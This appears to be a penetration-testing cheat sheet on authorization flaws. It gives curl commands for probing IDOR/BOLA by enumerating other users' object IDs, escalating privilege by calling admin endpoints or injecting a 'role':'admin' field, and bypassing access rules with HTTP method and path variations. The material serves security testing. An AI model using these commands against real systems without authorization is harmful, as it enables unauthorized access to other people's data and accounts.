# Authorization Testing — IDOR / BOLA / Access Control

## Fastest First-Pass Checklist

```bash
# Purpose: as a low-privilege user, request an object ID that isn't yours
curl -s -b "session=<low_priv_session>" https://target.example/api/orders/1001

# Purpose: try adjacent IDs to see if access is enforced per-object at all
for id in 1000 1001 1002 1003; do
    curl -s -b "session=<low_priv_session>" https://target.example/api/orders/$id -o "order_$id.json"
done

# Purpose: try accessing an admin-only path directly, bypassing UI-hidden links
curl -s -b "session=<low_priv_session>" https://target.example/admin/dashboard
```

## Technique: IDOR / BOLA (Broken Object Level Authorization)

**When to use it**: any endpoint that takes an object identifier (user ID,
order ID, document ID) in the URL, body, or query string.

**Fast path**:
```bash
# Purpose: swap the ID for one belonging to another user/object, same session
curl -s -b "session=<your_session>" https://target.example/api/users/<other_user_id>/profile

# Purpose: try both incrementing/decrementing numeric IDs and UUID-guessing if IDs are UUIDs
```
**Indicators**: 200 with another user's data returned, when it should be
403/404.

**Common Mistakes**: only testing GET requests — IDOR frequently exists on
PUT/DELETE/PATCH too (modify/delete someone else's object), which is
easy to miss if you only probe read paths.

## Technique: Vertical Privilege Escalation (Role Bypass)

**Fast path**:
```bash
# Purpose: call an admin-only endpoint with a regular user's session
curl -s -b "session=<user_session>" -X POST https://target.example/api/admin/users/promote -d '{"user_id":5}'

# Purpose: tamper with a client-controlled role parameter if the app trusts client input for authz
curl -s -b "session=<user_session>" -X POST https://target.example/api/profile -d '{"role":"admin"}'
```
**Indicators**: the app accepts a `role`/`isAdmin`/`permissions` field from
client-controlled input (request body, hidden form field, JWT claim
outside signature protection) instead of deriving it server-side from the
authenticated session.

## Technique: Horizontal Privilege / Missing Function-Level Access Control

**Fast path**:
```bash
# Purpose: directly request a path only linked in the UI for admin users, as a non-admin
curl -s -b "session=<user_session>" https://target.example/admin/export

# Purpose: try common admin/debug paths regardless of what the UI links
for p in admin debug console internal api/admin; do
    curl -s -o /dev/null -w "%{http_code} $p\n" -b "session=<user_session>" https://target.example/$p
done
```
**Indicators**: an unlinked-but-unprotected path returns 200 for a
non-privileged session — access control was only enforced by "we didn't
link it," not by an actual server-side check.

## Technique: HTTP Method / Path-Based Bypass

**Fast path**:
```bash
# Purpose: try alternate HTTP methods on a protected path — some middlewares only guard one method
curl -s -X POST https://target.example/admin/action
curl -s -X GET https://target.example/admin/action

# Purpose: try path variations that bypass naive string-match access control rules
curl -s https://target.example/Admin/dashboard      # case variation
curl -s https://target.example/admin/dashboard/     # trailing slash
curl -s https://target.example/admin/../admin/dashboard  # path normalization
curl -s https://target.example//admin/dashboard     # double slash
```
**Indicators**: a variant that a naive regex/prefix-match access-control
rule fails to catch, but the underlying router still resolves to the
protected handler.

## Common Mistakes

- Testing authorization with the same account/session used for functional
  recon — always keep at least two accounts of different privilege levels
  to compare responses cleanly.
- Assuming "not linked in the UI" means "not accessible" — always test
  directly.
- Only checking response status code, not response *body* — some apps
  return 200 with an empty/error-shaped body that looks like a block but
  isn't actually enforcing access control (or the reverse: 403 status but
  the data is still in the body).
